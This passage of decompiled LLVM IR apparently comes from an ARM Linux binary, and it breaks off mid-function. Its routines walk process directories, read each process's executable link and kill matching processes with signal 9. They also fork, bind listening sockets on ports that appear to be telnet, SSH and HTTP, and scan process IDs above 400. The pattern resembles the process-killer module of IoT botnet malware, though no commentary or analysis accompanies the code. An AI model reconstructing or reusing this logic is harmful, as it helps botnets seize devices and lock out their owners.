  %v3_e308 = call %dirent* @readdir(%__dirstream* %v1_e304)
  %v5_e308 = ptrtoint %dirent* %v3_e308 to i32
  store i32 %v5_e308, i32* @r6, align 4
  %v2_e30c = icmp eq %dirent* %v3_e308, null
  store i32 4096, i32* @r1, align 4
  store i32 %v2_df6c, i32* @r0, align 4
  br i1 %v2_e30c, label %dec_label_pc_e40c, label %dec_label_pc_e31cthread-pre-split

dec_label_pc_e31cthread-pre-split:                ; preds = %dec_label_pc_e304.preheader, %dec_label_pc_e304.loopexit
  %v0_e31c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e31c

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e31cthread-pre-split, %dec_label_pc_e3e4
  %v0_e31c = phi i32 [ %v0_e31c.pr, %dec_label_pc_e31cthread-pre-split ], [ 1, %dec_label_pc_e3e4 ]
  %v2_e31c = icmp eq i32 %v0_e31c, 0
  br i1 %v2_e31c, label %dec_label_pc_e324, label %dec_label_pc_e40c

dec_label_pc_e324:                                ; preds = %dec_label_pc_e31c
  %v0_e324 = call i32 @function_11a7c()
  %v0_e328 = load i32, i32* @r5, align 4
  %v2_e330 = inttoptr i32 %v0_e328 to i32*
  %v3_e330 = call i32 @function_112b0(i32 15, i32* %v2_e330)
  store i32 %v2_df58, i32* @r0, align 4
  %v3_e33c = call i32 @function_11a04(i8* %v2_e250, i32 %v3_e330)
  %v2_e344 = call i32 @function_119dc(i8* %v2_e250)
  %v0_e348 = load i32, i32* @r7, align 4
  %v0_e34c = load i32, i32* @sl, align 4
  %v2_e34c = add i32 %v0_e34c, %v2_e344
  store i32 %v2_e34c, i32* @r0, align 4
  %v2_e350 = inttoptr i32 %v2_e34c to i8*
  %v3_e350 = call i32 @function_11a04(i8* %v2_e350, i32 %v0_e348)
  %v2_e358 = call i32 @function_119dc(i8* %v2_e250)
  %v0_e35c = load i32, i32* @r5, align 4
  store i32 %v2_e358, i32* @r4, align 4
  %v2_e368 = inttoptr i32 %v0_e35c to i32*
  %v3_e368 = call i32 @function_112b0(i32 17, i32* %v2_e368)
  %v0_e370 = load i32, i32* @sl, align 4
  %v1_e370 = load i32, i32* @r4, align 4
  %v2_e370 = add i32 %v1_e370, %v0_e370
  store i32 %v2_e370, i32* @r0, align 4
  %v2_e374 = inttoptr i32 %v2_e370 to i8*
  %v3_e374 = call i32 @function_11a04(i8* %v2_e374, i32 %v3_e368)
  %v2_e37c = call i32 @function_119dc(i8* %v2_e250)
  %v0_e384 = load i32, i32* @sl, align 4
  %v2_e384 = add i32 %v0_e384, %v2_e37c
  store i32 %v2_e384, i32* @r0, align 4
  %v2_e388 = inttoptr i32 %v2_e384 to i8*
  %v3_e388 = call i32 @function_11a04(i8* %v2_e388, i32 ptrtoint (i32* @global_var_1226c.118 to i32))
  %v2_e390 = call i32 @function_119dc(i8* %v2_e250)
  %v0_e394 = load i32, i32* @r6, align 4
  %v1_e394 = add i32 %v0_e394, 11
  %v0_e398 = load i32, i32* @sl, align 4
  %v2_e398 = add i32 %v0_e398, %v2_e390
  store i32 %v2_e398, i32* @r0, align 4
  %v2_e39c = inttoptr i32 %v2_e398 to i8*
  %v3_e39c = call i32 @function_11a04(i8* %v2_e39c, i32 %v1_e394)
  %v7_e3ac = call i32 @readlink(i8* %v2_e250, i8* %tmp132, i32 4096)
  %v2_e3b0 = icmp eq i32 %v7_e3ac, -1
  br i1 %v2_e3b0, label %dec_label_pc_e304.loopexit, label %dec_label_pc_e3bc

dec_label_pc_e3bc:                                ; preds = %dec_label_pc_e324
  %v2_e3bc = call i32 @function_119dc(i8* %tmp132)
  store i32 %v2_e3bc, i32* @r1, align 4
  %v4_e3d0 = call i32 @function_11d30(i8* %tmp132, i32 %v2_e3bc, i32 %v2_e1e0.pre-phi)
  %v2_e3d4 = icmp eq i32 %v4_e3d0, -1
  br i1 %v2_e3d4, label %dec_label_pc_e304.loopexit, label %dec_label_pc_e3e4

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_e3bc
  %v0_e3dc = load i32, i32* @r7, align 4
  %v2_e3e4 = inttoptr i32 %v0_e3dc to i8*
  %v3_e3e4 = call i32 @function_11b08(i8* %v2_e3e4, i32 10)
  %v2_e3ec = call i32 @kill(i32 %v3_e3e4, i32 9)
  %v0_e3f0 = load i32, i32* %sb.global-to-local, align 4
  %v1_e3f0 = inttoptr i32 %v0_e3f0 to %__dirstream*
  %v3_e3f4 = call %dirent* @readdir(%__dirstream* %v1_e3f0)
  %v5_e3f4 = ptrtoint %dirent* %v3_e3f4 to i32
  store i32 %v5_e3f4, i32* @r6, align 4
  %v2_e3f8 = icmp eq %dirent* %v3_e3f4, null
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_df6c, i32* @r0, align 4
  br i1 %v2_e3f8, label %dec_label_pc_e40c, label %dec_label_pc_e31c

dec_label_pc_e40c:                                ; preds = %dec_label_pc_e304.preheader, %dec_label_pc_e304.loopexit, %dec_label_pc_e3e4, %dec_label_pc_e31c
  %v0_e40c = load i32, i32* %sb.global-to-local, align 4
  %v1_e40c = inttoptr i32 %v0_e40c to %__dirstream*
  %v3_e410 = call i32 @closedir(%__dirstream* %v1_e40c)
  %v0_e414 = load i32, i32* @r8, align 4
  %v1_e414 = inttoptr i32 %v0_e414 to %__dirstream*
  %v3_e418 = call %dirent* @readdir(%__dirstream* %v1_e414)
  %v2_e41c = icmp eq %dirent* %v3_e418, null
  br i1 %v2_e41c, label %dec_label_pc_e424, label %dec_label_pc_e220

dec_label_pc_e424:                                ; preds = %dec_label_pc_e210.loopexit, %dec_label_pc_e40c, %dec_label_pc_e220, %dec_label_pc_e210.preheader
  %v0_e424 = load i32, i32* @r8, align 4
  %v1_e424 = inttoptr i32 %v0_e424 to %__dirstream*
  %v3_e428 = call i32 @closedir(%__dirstream* %v1_e424)
  %v0_e42c = load i32, i32* @r5, align 4
  %v1_e42c = urem i32 %v0_e42c, 256
  br label %dec_label_pc_e430

dec_label_pc_e430:                                ; preds = %dec_label_pc_e1f0, %dec_label_pc_e424
  %storemerge = phi i32 [ %v1_e42c, %dec_label_pc_e424 ], [ %v5_e1fc, %dec_label_pc_e1f0 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e434 = call i32 @sleep(i32 1)
  %v1_e43c = call i32 @function_112dc(i32 15)
  %v1_e444 = call i32 @function_112dc(i32 16)
  %v1_e44c = call i32 @function_112dc(i32 17)
  br label %dec_label_pc_e450

dec_label_pc_e450:                                ; preds = %dec_label_pc_dff4, %dec_label_pc_e490, %dec_label_pc_e430
  %v0_e450 = load i32, i32* @r4, align 4
  %v2_e45c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e45c, i32* @r4, align 4
  store i32 %v6_df44, i32* @r5, align 4
  store i32 %v9_df44, i32* @r6, align 4
  store i32 %v12_df44, i32* @r7, align 4
  store i32 %v15_df44, i32* @r8, align 4
  store i32 %v21_df44, i32* @sl, align 4
  ret i32 %v0_e450

dec_label_pc_e460:                                ; preds = %dec_label_pc_e144
  %v1_e460 = add i32 %v0_e460, 1
  %v7_e464 = icmp eq i32 %v0_e460, 0
  br i1 %v7_e464, label %dec_label_pc_e46c, label %dec_label_pc_e14c

dec_label_pc_e46c:                                ; preds = %dec_label_pc_e460
  %v1_e46c = add i32 %v0_e154, 3
  %v2_e46c = inttoptr i32 %v1_e46c to i8*
  %v3_e46c = load i8, i8* %v2_e46c, align 1
  %v7_e470 = icmp eq i8 %v3_e46c, 65
  br i1 %v7_e470, label %dec_label_pc_e480, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e46c
  br label %dec_label_pc_e11c.backedge

dec_label_pc_e480:                                ; preds = %dec_label_pc_e46c
  store i32 %v1_e460, i32* @r4, align 4
  br label %dec_label_pc_e11c.backedge

dec_label_pc_e11c.backedge:                       ; preds = %.thread33, %dec_label_pc_e480, %dec_label_pc_e150
  %v0_e15c81 = phi i32 [ %v1_e460, %dec_label_pc_e480 ], [ %v0_e15c82, %dec_label_pc_e150 ], [ %v0_e15c82, %.thread33 ]
  %v0_e46070 = phi i32 [ %v1_e460, %dec_label_pc_e480 ], [ %v0_e150, %dec_label_pc_e150 ], [ %v1_e460, %.thread33 ]
  %v0_e144.pr67 = phi i32 [ 0, %dec_label_pc_e480 ], [ %v0_e144.pr68, %dec_label_pc_e150 ], [ 0, %.thread33 ]
  %v0_e11c = add i32 %v0_e154, 1
  %v1_e11c = add i32 %v0_e154, 3
  %v2_e11c = inttoptr i32 %v1_e11c to i8*
  %v3_e11c = load i8, i8* %v2_e11c, align 1
  %v2_e120 = icmp eq i8 %v3_e11c, 0
  %v1_e124 = add i32 %v0_e12478, 1
  br i1 %v2_e120, label %dec_label_pc_e15c, label %dec_label_pc_e12c

dec_label_pc_e490:                                ; preds = %dec_label_pc_e1d4
  %v1_e494 = call i32 @function_112dc(i32 15)
  %v1_e49c = call i32 @function_112dc(i32 16)
  %v1_e4a4 = call i32 @function_112dc(i32 17)
  %v1_e4ac = call i32 @function_112dc(i32 19)
  br label %dec_label_pc_e450

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_df44
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_dff4

; uselistorder directives
  uselistorder i32 %v1_e124, { 1, 0 }
  uselistorder i8 %v3_e11c, { 1, 0 }
  uselistorder i32 %v0_e15c81, { 1, 0 }
  uselistorder i32 %v1_e460, { 4, 3, 0, 2, 1 }
  uselistorder %dirent* %v3_e418, { 1, 0 }
  uselistorder i8* %tmp132, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e188, { 1, 0 }
  uselistorder i32 %v0_e19428, { 1, 0 }
  uselistorder i32 %v1_e1ac, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e150, { 1, 0 }
  uselistorder i32 %v0_e12478, { 1, 0 }
  uselistorder i32 %v0_e460, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e15c82, { 1, 2, 0 }
  uselistorder i32 %v1_e12452, { 1, 0 }
  uselistorder i32 %v2_e108, { 1, 0 }
  uselistorder i32 %v1_e104, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v0_e0c013, { 1, 0, 2 }
  uselistorder i32 %v0_e0b0, { 1, 0 }
  uselistorder i32 %v1_e090, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %v3_dfb4, { 1, 0, 2 }
  uselistorder i32 %v2_df6c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8773, { 1, 0, 2 }
  uselistorder i8* %stack_var_-581, { 2, 0, 1 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32)* @function_11b08, { 1, 0 }
  uselistorder i32 47, { 1, 2, 0 }
  uselistorder i32 (i32*, i32, i32)* @function_11c34, { 1, 0 }
  uselistorder i32 512, { 4, 0, 1, 7, 5, 6, 8, 2, 9, 3, 10 }
  uselistorder i32* (i32*, i32, i32)* @memset, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_e11c.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e450, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e430, { 1, 0 }
  uselistorder label %dec_label_pc_e424, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e40c, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_e31c, { 1, 0 }
  uselistorder label %dec_label_pc_e31cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e304.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e220, { 1, 0 }
  uselistorder label %dec_label_pc_e220.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e210.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e1a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e150, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e12c, { 1, 0 }
  uselistorder label %dec_label_pc_e0d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e034.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_e084, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_e04c, { 1, 0 }
  uselistorder label %dec_label_pc_dff4, { 1, 0 }
}

define i32 @function_e4e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_e4e0:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4304 = alloca i32, align 4
  %stack_var_-4260 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-8412 = alloca i32, align 4
  %stack_var_-8356 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e4e0 = load i32, i32* @r4, align 4
  store i32 %v3_e4e0, i32* %stack_var_-36, align 4
  %v6_e4e0 = load i32, i32* @r5, align 4
  %v9_e4e0 = load i32, i32* @r6, align 4
  %v12_e4e0 = load i32, i32* @r7, align 4
  %v2_e4f0 = call i32 @time(i32* null)
  store i32 %v2_e4f0, i32* @r7, align 4
  %v0_e4f8 = call i32 @fork()
  %v2_e4fc = icmp eq i32 %v0_e4f8, -1
  %. = zext i1 %v2_e4fc to i32
  %tmp142 = icmp slt i32 %v0_e4f8, 1
  %storemerge109 = select i1 %tmp142, i32 %., i32 1
  store i32 %storemerge109, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1a71c.116 to i32), i32* %r3.global-to-local, align 4
  %v2_e518 = icmp eq i32 %storemerge109, 0
  store i32 %v0_e4f8, i32* @global_var_1a71c.116, align 4
  br i1 %v2_e518, label %dec_label_pc_e530, label %dec_label_pc_e524

dec_label_pc_e524:                                ; preds = %dec_label_pc_e7c4, %dec_label_pc_e69c, %dec_label_pc_e4e0
  %v29_e52c = phi i32 [ -1, %dec_label_pc_e69c ], [ %v0_e4f8, %dec_label_pc_e4e0 ], [ %v5_e7d8, %dec_label_pc_e7c4 ]
  %v2_e52c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e52c, i32* @r4, align 4
  store i32 %v6_e4e0, i32* @r5, align 4
  store i32 %v9_e4e0, i32* @r6, align 4
  store i32 %v12_e4e0, i32* @r7, align 4
  ret i32 %v29_e52c

dec_label_pc_e530:                                ; preds = %dec_label_pc_e4e0
  %v2_e530 = ptrtoint i32* %stack_var_-220 to i32
  store i32 2, i32* @r6, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v1_e548 = call i32 @function_df44(i32 5888)
  store i32 %v2_e530, i32* %ip.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v0_e554 = load i32, i32* @r6, align 4
  %v0_e55c = load i32, i32* @r5, align 4
  store i32 %v0_e55c, i32* %r2.global-to-local, align 4
  %v3_e568 = call i32 @socket(i32 %v0_e554, i32 1, i32 %v0_e55c)
  %v2_e56c = icmp eq i32 %v3_e568, -1
  store i32 %v3_e568, i32* @r4, align 4
  br i1 %v2_e56c, label %dec_label_pc_e594, label %dec_label_pc_e578

dec_label_pc_e578:                                ; preds = %dec_label_pc_e530
  %v2_e57c = ptrtoint i32* %stack_var_-64 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e584 = call i32 @bind(i32 %v2_e57c, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e588 = load i32, i32* @r4, align 4
  %v2_e590 = call i32 @listen(i32 %v0_e588, i32 1)
  br label %dec_label_pc_e594

dec_label_pc_e594:                                ; preds = %dec_label_pc_e530, %dec_label_pc_e578
  %v1_e598 = call i32 @function_df44(i32 5632)
  store i32 %v2_e530, i32* %ip.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_e5a4 = load i32, i32* @r6, align 4
  %v0_e5ac = load i32, i32* @r5, align 4
  store i32 %v0_e5ac, i32* %r2.global-to-local, align 4
  %v3_e5b8 = call i32 @socket(i32 %v0_e5a4, i32 1, i32 %v0_e5ac)
  %v2_e5bc = icmp eq i32 %v3_e5b8, -1
  store i32 %v3_e5b8, i32* @r4, align 4
  br i1 %v2_e5bc, label %dec_label_pc_e5e4, label %dec_label_pc_e5c8

dec_label_pc_e5c8:                                ; preds = %dec_label_pc_e594
  %v2_e5cc = ptrtoint i32* %stack_var_-64 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e5d4 = call i32 @bind(i32 %v2_e5cc, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e5d8 = load i32, i32* @r4, align 4
  %v2_e5e0 = call i32 @listen(i32 %v0_e5d8, i32 1)
  br label %dec_label_pc_e5e4

dec_label_pc_e5e4:                                ; preds = %dec_label_pc_e594, %dec_label_pc_e5c8
  %v1_e5ec = call i32 @function_df44(i32 58811)
  store i32 229, i32* %ip.global-to-local, align 4
  store i32 %v2_e530, i32* %r3.global-to-local, align 4
  %v0_e604 = load i32, i32* @r6, align 4
  %v0_e60c = load i32, i32* @r5, align 4
  store i32 %v0_e60c, i32* %r2.global-to-local, align 4
  %v3_e614 = call i32 @socket(i32 %v0_e604, i32 1, i32 %v0_e60c)
  %v2_e618 = icmp eq i32 %v3_e614, -1
  store i32 %v3_e614, i32* @r4, align 4
  br i1 %v2_e618, label %dec_label_pc_e640, label %dec_label_pc_e624

dec_label_pc_e624:                                ; preds = %dec_label_pc_e5e4
  %v2_e628 = ptrtoint i32* %stack_var_-64 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e630 = call i32 @bind(i32 %v2_e628, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e634 = load i32, i32* @r4, align 4
  %v2_e63c = call i32 @listen(i32 %v0_e634, i32 1)
  br label %dec_label_pc_e640

dec_label_pc_e640:                                ; preds = %dec_label_pc_e5e4, %dec_label_pc_e624
  %v1_e648 = call i32 @function_df44(i32 add (i32 ptrtoint (i32* @global_var_c700.120 to i32), i32 7))
  store i32 199, i32* %ip.global-to-local, align 4
  store i32 %v2_e530, i32* %r3.global-to-local, align 4
  %v0_e660 = load i32, i32* @r6, align 4
  %v0_e668 = load i32, i32* @r5, align 4
  store i32 %v0_e668, i32* %r2.global-to-local, align 4
  %v3_e670 = call i32 @socket(i32 %v0_e660, i32 1, i32 %v0_e668)
  %v2_e674 = icmp eq i32 %v3_e670, -1
  store i32 %v3_e670, i32* @r4, align 4
  br i1 %v2_e674, label %dec_label_pc_e69c, label %dec_label_pc_e680

dec_label_pc_e680:                                ; preds = %dec_label_pc_e640
  %v2_e684 = ptrtoint i32* %stack_var_-64 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e68c = call i32 @bind(i32 %v2_e684, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e690 = load i32, i32* @r4, align 4
  %v2_e698 = call i32 @listen(i32 %v0_e690, i32 1)
  br label %dec_label_pc_e69c

dec_label_pc_e69c:                                ; preds = %dec_label_pc_e640, %dec_label_pc_e680
  %v1_e6a0 = call i32 @sleep(i32 5)
  %v1_e6a8 = call i32* @malloc(i32 4096)
  %v3_e6a8 = ptrtoint i32* %v1_e6a8 to i32
  store i32 ptrtoint (i8** @global_var_1a718.122 to i32), i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6c0.124 to i32), i32* %r3.global-to-local, align 4
  store i32 %v3_e6a8, i32* %r2.global-to-local, align 4
  %v0_e6b8 = load i32, i32* @r5, align 4
  %v1_e6b8 = trunc i32 %v0_e6b8 to i8
  %v3_e6b8 = bitcast i32* %v1_e6a8 to i8*
  store i8 %v1_e6b8, i8* %v3_e6b8, align 1
  %v0_e6c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e6c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_e6c0 = inttoptr i32 %v1_e6c0 to i32*
  store i32 %v0_e6c0, i32* %v2_e6c0, align 4
  %v0_e6c4 = load i32, i32* @r5, align 4
  %v1_e6c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_e6c4 = inttoptr i32 %v1_e6c4 to i32*
  store i32 %v0_e6c4, i32* %v2_e6c4, align 4
  %v1_e6c8 = call i32 @function_11394(i32 15)
  %v1_e6d0 = call i32 @function_11394(i32 16)
  %v2_e6d4 = ptrtoint i32* %stack_var_-8356 to i32
  store i32 %v2_e6d4, i32* %stack_var_-8412, align 4
  %v0_e6e0 = load i32, i32* @r5, align 4
  %v2_e6e4 = inttoptr i32 %v0_e6e0 to i32*
  %v3_e6e4 = call i32 @function_112b0(i32 15, i32* %v2_e6e4)
  %v1_e6ec = add i32 %v2_e6d4, -44
  store i32 %v1_e6ec, i32* %r2.global-to-local, align 4
  store i32 %v1_e6ec, i32* @r0, align 4
  store i32 %v1_e6ec, i32* %stack_var_-8412, align 4
  %v2_e6fc = inttoptr i32 %v1_e6ec to i8*
  %v3_e6fc = call i32 @function_11a04(i8* %v2_e6fc, i32 %v3_e6e4)
  store i32 %v1_e6ec, i32* %r3.global-to-local, align 4
  %v2_e704 = add i32 %v1_e6ec, %v3_e6fc
  store i32 %v2_e704, i32* @r4, align 4
  %v1_e708 = call i32 @getpid()
  %v2_e710 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_e710, i32* %r2.global-to-local, align 4
  %v3_e718 = trunc i32 %v1_e708 to i8
  %v4_e718 = call i32 @function_11e40(i8 %v3_e718, i32 10, i32 %v2_e710)
  %v0_e720 = load i32, i32* @r4, align 4
  store i32 %v0_e720, i32* @r0, align 4
  %v2_e724 = inttoptr i32 %v0_e720 to i8*
  %v3_e724 = call i32 @function_11a04(i8* %v2_e724, i32 %v4_e718)
  %v0_e728 = load i32, i32* @r5, align 4
  %v0_e72c = load i32, i32* @r4, align 4
  %v2_e72c = add i32 %v0_e72c, %v3_e724
  store i32 %v2_e72c, i32* @r4, align 4
  %v2_e734 = inttoptr i32 %v0_e728 to i32*
  %v3_e734 = call i32 @function_112b0(i32 16, i32* %v2_e734)
  %v0_e73c = load i32, i32* @r4, align 4
  store i32 %v0_e73c, i32* @r0, align 4
  %v2_e740 = inttoptr i32 %v0_e73c to i8*
  %v3_e740 = call i32 @function_11a04(i8* %v2_e740, i32 %v3_e734)
  %v0_e744 = load i32, i32* @r5, align 4
  store i32 %v3_e740, i32* @r6, align 4
  %v2_e74c = load i32, i32* %stack_var_-8412, align 4
  %v3_e74c = inttoptr i32 %v2_e74c to i8*
  %v4_e750 = call i32 (i8*, i32, ...) @open(i8* %v3_e74c, i32 %v0_e744)
  %v2_e754 = icmp eq i32 %v4_e750, -1
  br i1 %v2_e754, label %dec_label_pc_e524, label %dec_label_pc_e75c

dec_label_pc_e75c:                                ; preds = %dec_label_pc_e69c
  %v1_e75c = call i32 @close(i32 %v4_e750)
  %v1_e764 = call i32 @function_112dc(i32 15)
  %v1_e76c = call i32 @function_112dc(i32 16)
  store i32 ptrtoint (i8** @global_var_1a718.122 to i32), i32* %ip.global-to-local, align 4
  %v2_e778 = load i8*, i8** @global_var_1a718.122, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_e780 = load i32, i32* %stack_var_-8412, align 4
  %v3_e780 = inttoptr i32 %v2_e780 to i8*
  %v6_e784 = call i32 @readlink(i8* %v3_e780, i8* %v2_e778, i32 4095)
  %v2_e788 = icmp eq i32 %v6_e784, -1
  br i1 %v2_e788, label %.thread5, label %bb145

bb145:                                            ; preds = %dec_label_pc_e75c
  %v3_e790 = load i32, i32* bitcast (i8** @global_var_1a718.122 to i32*), align 4
  store i32 %v3_e790, i32* %r3.global-to-local, align 4
  %v1_e794 = load i32, i32* @r5, align 4
  %v2_e794 = trunc i32 %v1_e794 to i8
  %v5_e794 = add i32 %v3_e790, %v6_e784
  %v6_e794 = inttoptr i32 %v5_e794 to i8*
  store i8 %v2_e794, i8* %v6_e794, align 1
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_e75c, %bb145
  %v2_e798 = load i32, i32* %stack_var_-8412, align 4
  store i32 %v2_e798, i32* %r2.global-to-local, align 4
  %v0_e79c = load i32, i32* @r4, align 4
  %v1_e79c = load i32, i32* @r6, align 4
  %v2_e79c = sub i32 %v0_e79c, %v2_e798
  %v2_e7a4 = add i32 %v2_e79c, %v1_e79c
  store i32 %v2_e7a4, i32* @r1, align 4
  store i32 %v2_e798, i32* @r0, align 4
  %v2_e7ac = ptrtoint i32* %stack_var_-4260 to i32
  store i32 %v2_e7ac, i32* %sl.global-to-local, align 4
  %v0_e7b0 = call i32 @function_11a7c()
  %v0_e7b4 = load i32, i32* @r7, align 4
  store i32 %v0_e7b4, i32* @r4, align 4
  %v0_e7b8 = load i32, i32* @r5, align 4
  %v2_e7bc = ptrtoint i32* %stack_var_-4304 to i32
  store i32 %v2_e7bc, i32* %sl.global-to-local, align 4
  store i32 400, i32* @r5, align 4
  %v2_e8b8 = ptrtoint i32* %stack_var_-208 to i32
  %v2_e8bc = bitcast i32* %stack_var_-208 to i8*
  %v2_e908 = ptrtoint i32* %stack_var_-144 to i32
  %v2_e90c = bitcast i32* %stack_var_-144 to i8*
  %v2_e984 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_e7c4

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e87c, %.thread5
  %stack_var_-8404.0 = phi i32 [ %v0_e7b8, %.thread5 ], [ %stack_var_-8404.3, %dec_label_pc_e87c ]
  %v1_e7c8 = call i32 @function_11394(i32 15)
  %v3_e7d4 = call i32 @function_112b0(i32 15, i32* null)
  %v4_e7d4 = inttoptr i32 %v3_e7d4 to i8*
  %v3_e7d8 = call %__dirstream* @opendir(i8* %v4_e7d4)
  %v5_e7d8 = ptrtoint %__dirstream* %v3_e7d8 to i32
  store i32 %v5_e7d8, i32* %sb.global-to-local, align 4
  %v2_e7dc = icmp eq %__dirstream* %v3_e7d8, null
  br i1 %v2_e7dc, label %dec_label_pc_e524, label %dec_label_pc_e7e4

dec_label_pc_e7e4:                                ; preds = %dec_label_pc_e7c4
  %v1_e7e8 = call i32 @function_112dc(i32 15)
  %v0_e7ec68 = load i32, i32* %sb.global-to-local, align 4
  %v1_e7ec69 = inttoptr i32 %v0_e7ec68 to %__dirstream*
  %v3_e7f070 = call %dirent* @readdir(%__dirstream* %v1_e7ec69)
  %v2_e7f473 = icmp eq %dirent* %v3_e7f070, null
  br i1 %v2_e7f473, label %dec_label_pc_e87c, label %dec_label_pc_e7fc.preheader

dec_label_pc_e7fc.preheader:                      ; preds = %dec_label_pc_e7e4, %dec_label_pc_e7ec.backedge
  %v0_e7fc82.in = phi %dirent* [ %v3_e7f0, %dec_label_pc_e7ec.backedge ], [ %v3_e7f070, %dec_label_pc_e7e4 ]
  %stack_var_-8404.174 = phi i32 [ %stack_var_-8404.1.be, %dec_label_pc_e7ec.backedge ], [ %stack_var_-8404.0, %dec_label_pc_e7e4 ]
  br label %dec_label_pc_e7fc

dec_label_pc_e7fc:                                ; preds = %dec_label_pc_e7fc.preheader, %dec_label_pc_e864
  %v0_e80c.in = phi %dirent* [ %v3_e870, %dec_label_pc_e864 ], [ %v0_e7fc82.in, %dec_label_pc_e7fc.preheader ]
  %stack_var_-8404.2 = phi i32 [ %v1_e820, %dec_label_pc_e864 ], [ %stack_var_-8404.174, %dec_label_pc_e7fc.preheader ]
  %v0_e80c = ptrtoint %dirent* %v0_e80c.in to i32
  %v1_e7fc = add i32 %v0_e80c, 11
  %v2_e7fc = inttoptr i32 %v1_e7fc to i8*
  %v3_e7fc = load i8, i8* %v2_e7fc, align 1
  %v4_e7fc = zext i8 %v3_e7fc to i32
  %v1_e800 = add nsw i32 %v4_e7fc, -48
  store i32 %v1_e800, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e800, 9
  br i1 %tmp, label %dec_label_pc_e7ec.backedge, label %dec_label_pc_e80c

dec_label_pc_e80c:                                ; preds = %dec_label_pc_e7fc
  store i32 %v1_e7fc, i32* @r6, align 4
  %v4_e814 = call i32 @atoi(i8* %v2_e7fc)
  %v0_e81c = load i32, i32* @r5, align 4
  %v1_e820 = add i32 %stack_var_-8404.2, 1
  store i32 %v1_e820, i32* %r3.global-to-local, align 4
  store i32 %v4_e814, i32* @r7, align 4
  %v5_e82c = icmp slt i32 %v0_e81c, %v4_e814
  %v2_e88c = call i32 @time(i32* null)
  br i1 %v5_e82c, label %dec_label_pc_e888, label %dec_label_pc_e830

dec_label_pc_e830:                                ; preds = %dec_label_pc_e80c
  %v0_e838 = load i32, i32* @r4, align 4
  %v2_e838 = sub i32 %v2_e88c, %v0_e838
  %v7_e840 = icmp slt i32 %v2_e838, 601
  br i1 %v7_e840, label %dec_label_pc_e848, label %.thread6

.thread6:                                         ; preds = %dec_label_pc_e830
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_e7ec.backedge

dec_label_pc_e848:                                ; preds = %dec_label_pc_e830
  %v0_e848 = load i32, i32* @r7, align 4
  %v7_e84c = icmp slt i32 %v0_e848, 401
  br i1 %v7_e84c, label %dec_label_pc_e7ec.backedge, label %dec_label_pc_e850

dec_label_pc_e850:                                ; preds = %dec_label_pc_e848
